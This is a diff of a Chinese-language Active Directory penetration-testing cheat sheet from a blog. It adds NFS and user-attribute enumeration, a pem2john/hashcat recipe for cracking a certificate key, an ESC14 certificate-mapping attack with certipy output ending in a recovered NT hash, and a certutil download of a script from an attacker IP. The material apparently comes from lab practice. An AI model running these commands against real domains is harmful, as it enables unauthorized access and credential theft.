@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 ftp匿名连接\rftp &lt;ip&gt; 使用账号密码anonymous 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
 <title>血缇之书</title>
 
-<link rel='canonical' href='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<link rel='canonical' href='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="血缇之书">
-<meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 ftp匿名连接\rftp &lt;ip&gt; 使用账号密码anonymous 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n">
-<meta property='og:url' content='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
+<meta property='og:url' content='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-08-23T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-08-23T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
-<meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 ftp匿名连接\rftp &lt;ip&gt; 使用账号密码anonymous 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n">
+<meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
     </head>
     <body class="
     article-page
@@ -212,8 +212,9 @@
         <li><a href="#域名解析">域名解析</a></li>
         <li><a href="#同步时间">同步时间</a></li>
         <li><a href="#端口详细扫">端口详细扫</a></li>
-        <li><a href="#ftp匿名连接">ftp匿名连接</a></li>
         <li><a href="#域sid">域sid</a></li>
+        <li><a href="#ftp匿名连接">ftp匿名连接</a></li>
+        <li><a href="#nfs相关">NFS相关</a></li>
         <li><a href="#查询smb共享">查询smb共享</a></li>
         <li><a href="#rpc相关">rpc相关</a></li>
         <li><a href="#无预认证票据烘焙攻击as-rep-roasting">无预认证票据烘焙攻击（AS-REP Roasting）</a></li>
@@ -246,7 +247,7 @@
         <li><a href="#查看保存凭证">查看保存凭证</a></li>
         <li><a href="#powershell历史记录">powershell历史记录</a></li>
         <li><a href="#查spn需要管理权限">查spn（需要管理权限）</a></li>
-        <li><a href="#acl详细枚举">acl详细枚举</a></li>
+        <li><a href="#acl及用户属性详细枚举">acl及用户属性详细枚举</a></li>
         <li><a href="#枚举本机可写目录">枚举本机可写目录</a></li>
         <li><a href="#委派">委派</a></li>
         <li><a href="#无约束委派">无约束委派</a></li>
@@ -274,6 +275,7 @@
         <li><a href="#ansible密钥爆破">ansible密钥爆破</a></li>
         <li><a href="#kdbx数据爆破">kdbx数据爆破</a></li>
         <li><a href="#pfx证书爆破">pfx证书爆破</a></li>
+        <li><a href="#certkey爆破">cert.key爆破</a></li>
         <li><a href="#zip压缩包爆破">zip压缩包爆破</a></li>
         <li><a href="#putty数据爆破">putty数据爆破</a></li>
       </ul>
@@ -433,6 +435,7 @@
         <li><a href="#esc4">ESC4</a></li>
         <li><a href="#esc8">ESC8</a></li>
         <li><a href="#esc9">ESC9</a></li>
+        <li><a href="#esc14显式证书映射">ESC14(显式证书映射)</a></li>
         <li><a href="#esc15ekuwu">ESC15(EKUwu)</a></li>
         <li><a href="#esc16">ESC16</a></li>
         <li><a href="#passthecert传递证书攻击">PassTheCert（传递证书攻击）</a></li>
@@ -661,7 +664,7 @@
 
 
                 <time class="article-time--reading">
-                    42 minute read
+                    43 minute read
                 </time>
             </div>
         
@@ -698,9 +701,6 @@
 </span></span><span style="display:flex;"><span>sudo date -s <span style="color:#e6db74">&#34;2025-06-12 04:02:28&#34;</span>
 </span></span></code></pre></div><h3 id="端口详细扫">端口详细扫
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmap -p 88,389,445,139,135 -sC -sV --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span> -Pn dc01
-</span></span></code></pre></div><h3 id="ftp匿名连接">ftp匿名连接
-</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ftp &lt;ip&gt;
-</span></span><span style="display:flex;"><span>使用账号密码anonymous
 </span></span></code></pre></div><h3 id="域sid">域sid
 </h3><p>nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass -k --get-sid
@@ -711,6 +711,12 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADDomain | fl DomainSID
 </span></span></code></pre></div><p>powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Get-DomainSid
+</span></span></code></pre></div><h3 id="ftp匿名连接">ftp匿名连接
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ftp &lt;ip&gt;
+</span></span><span style="display:flex;"><span>使用账号密码anonymous
+</span></span></code></pre></div><h3 id="nfs相关">NFS相关
+</h3><p>查找匿名共享</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>showmount -e $ip
 </span></span></code></pre></div><h3 id="查询smb共享">查询smb共享
 </h3><h4 id="nxc">nxc
 </h4><p>用户密码</p>
@@ -882,13 +888,18 @@
 </span></span></code></pre></div><h3 id="查spn需要管理权限">查spn（需要管理权限）
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADUser -Filter {ServicePrincipalName <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;*&#34;</span>} -Properties ServicePrincipalName |
 </span></span><span style="display:flex;"><span>Select-Object SamAccountName, ServicePrincipalName
-</span></span></code></pre></div><h3 id="acl详细枚举">acl详细枚举
+</span></span></code></pre></div><h3 id="acl及用户属性详细枚举">acl及用户属性详细枚举
 </h3><h4 id="目标可写枚举">目标可写枚举
 </h4><p>bloodyad远程</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodyAD --host $FQDN --dc-ip $ip -d $domain -u $user -p $pass get writable --detail
 </span></span></code></pre></div><p>powerview本地</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#查找当前用户高危权限，就包含可写</span>
 </span></span><span style="display:flex;"><span>Find-InterestingDomainAcl -ResolveGUIDs
+</span></span></code></pre></div><h4 id="用户属性详细枚举">用户属性详细枚举
+</h4><p>powerview 远程powerview也可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Get-DomainUser -Identity $查询_user -Properties *
+</span></span></code></pre></div><p>nxc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>netexec ldap $ip -u $user -p $pass --query <span style="color:#e6db74">&#34;(sAMAccountName=</span>$<span style="color:#e6db74">查询_user)&#34;</span> <span style="color:#e6db74">&#34;&#34;</span>
 </span></span></code></pre></div><h3 id="枚举本机可写目录">枚举本机可写目录
 </h3><p>上传accesschk64</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\a</span>ccesschk64 /accepteula -uwds $domain<span style="color:#ae81ff">\$</span>user C:<span style="color:#ae81ff">\W</span>indows
@@ -1028,6 +1039,13 @@ nxc</p>
 </span></span></code></pre></div><p>利用解密出来的证书和原证书生成私钥和证书</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>openssl rsa -in file.key-enc -out file.key
 </span></span><span style="display:flex;"><span>openssl pkcs12 -in file.pfx -clcerts -nokeys -out file.crt
+</span></span></code></pre></div><h3 id="certkey爆破">cert.key爆破
+</h3><p>也可以正对key直接爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>pem2john cert.key | tee hash
+</span></span></code></pre></div><p>删去hash部分中的$pbkdf 2$sha256$aes256_cbc，才能hashcat爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>hashcat hash rockyou.txt 
+</span></span></code></pre></div><p>之后可以利用key和cert创建pfx证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>openssl pkcs12 -export -inkey cert.key -in cert.crt -out cert.pfx
 </span></span></code></pre></div><h3 id="zip压缩包爆破">zip压缩包爆破
 </h3><p>zip压缩包格式很多，解密出来的hash格式需要去hashcat对照表修改进行爆破，但是简单来说只要把文件名删去即可</p>
 <p>首先是john转换hash</p>
@@ -2489,6 +2507,30 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
 </span></span></code></pre></div><p>利用“管理员”证书获取真管理员hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
+</span></span></code></pre></div><h3 id="esc14显式证书映射">ESC14(显式证书映射)
+</h3><p>计算机和用户的 altSecurityIdentities 属性允许指定显式证书映射 。显式证书映射是对证书的引用。任何证书与主体的显式证书映射中的引用匹配的人都可以使用此证书作为主体进行身份验证，</p>
+<p>certipy并不会输出esc14，想要找到此攻击途径需要枚举用户的属性，查看是否存在altSecurityIdentities，这里我记一个攻击记录</p>
+<p>枚举到a用户具有属性</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>altSecurityIdentities             : X509:&lt;RFC822&gt;a@www.com
+</span></span></code></pre></div><p>讲的就是邮箱等于a@www.com的人请求的证书可以直接用于a用户认证</p>
+<p>假如此时c用户对b用户有写入权限，且b用户允许请求一个用于认证的证书，我们可以利用c给b的邮箱写入a@www.com</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodyAD --host $ip -d $domain -u c -p $pass set object b mail -v a@www.com
+</span></span></code></pre></div><p>b用户请求的证书允许用来认证a用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy req -username b@$domain -hashes :$hash -target $ip -ca $ca -template $证书模板 -dc-ip $ip
+</span></span></code></pre></div><p>假设请求下来的是b.pkf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>└─$ certipy auth -pfx b.pfx -dc-ip $ip -domain $domain -username a
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     No identities found in this certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find identity in the provided certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;a@$domain&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;a.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;a.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;a&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;a@$domain&#39;</span>: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
 </span></span></code></pre></div><h3 id="esc15ekuwu">ESC15(EKUwu)
 </h3><h4 id="a打法-通过-schannel-直接模拟-注入客户端身份验证应用程序策略">a打法-通过 schannel 直接模拟 （注入“客户端身份验证”应用程序策略）
 </h4><p>首先请求证书</p>
@@ -3349,7 +3391,7 @@ linux换行</p>
 </span></span></code></pre></div><h3 id="windows上传文件">windows上传文件
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cmd
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//你的IP/文件路径 保存路径
-</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">7</span>/RunasCs.exe C:\Users\RSA_4810\Documents\RunasCs.exe
+</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">22</span>/LansweeperDecrypt.ps1 C:\windows\tasks\LansweeperDecrypt.ps1
 </span></span><span style="display:flex;"><span>powershell
 </span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">2</span>/hr.exe -OutFile <span style="color:#e6db74">&#34;C:\users\alexander.green\Desktop\hr.exe&#34;</span>
 </span></span><span style="display:flex;"><span>或者
@@ -3719,7 +3761,7 @@ linux换行</p>
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
